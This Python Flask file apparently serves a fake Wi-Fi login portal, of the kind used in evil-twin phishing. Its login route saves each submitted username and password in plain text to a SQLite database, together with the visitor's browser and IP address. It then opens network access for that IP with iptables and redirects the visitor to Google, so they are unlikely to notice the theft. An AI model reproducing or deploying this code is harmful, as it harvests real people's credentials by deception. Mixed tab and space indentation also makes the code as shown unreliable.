# -*- encoding: utf-8 -*-
"""
Autor: alexfrancow
"""

#################
#### imports ####
#################

from flask import Flask, Blueprint, render_template, request, redirect, send_from_directory
from flask import jsonify
import sqlite3 as sql
import datetime
import httpagentparser
import subprocess

####################
#### blueprints ####
####################

login_blueprint = Blueprint('login', __name__, template_folder='templates')
users_blueprint = Blueprint('users', __name__, template_folder='templates')
clear_blueprint = Blueprint('clear', __name__, template_folder='templates')
admin_blueprint = Blueprint('admin', __name__, template_folder='templates')
db_blueprint = Blueprint('db', __name__, template_folder='templates')

################
#### config ####
################

app = Flask(__name__)

###################
#### functions ####
###################

def insert_readings(user, passwd, time, UA, remote_IP):
    DATABASE = 'test.db'
    with sql.connect(DATABASE) as con:
        cur = con.cursor()
        #cur.execute("CREATE TABLE users (user TEXT, passwd TEXT, time DATETIME)")
        #cur.execute("alter table users add column time DATETIME")
        #cur.execute("alter table users add column UA TEXT")
	#cur.execute("alter table users add column remote_IP TEXT")
        cur.execute("INSERT INTO users (user, passwd, time, UA, remote_IP) VALUES (?,?,?,?,?)", (user, passwd, time, UA, remote_IP))
        con.commit()

################
#### routes ####
################

@login_blueprint.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        user = request.form['user']
        passwd = request.form['passwd']
        currentDT = datetime.datetime.now().strftime("%Y-%m-%d %H:%M")
        time = str(currentDT)
        UA = request.headers.get('User-Agent')
        UA = httpagentparser.simple_detect(UA)
        UA = ' '.join(UA)
	remote_IP = request.remote_addr
        print (UA)
        insert_readings(user, passwd, time, UA, remote_IP)
	print(remote_IP)
	subprocess.call(["iptables","-t", "nat", "-I", "PREROUTING","1", "-s", remote_IP, "-j" ,"ACCEPT"])
	subprocess.call(["iptables", "-I", "FORWARD", "-s", remote_IP, "-j" ,"ACCEPT"])
	return redirect("https://www.google.es", code=302)

    return render_template('index2.html')
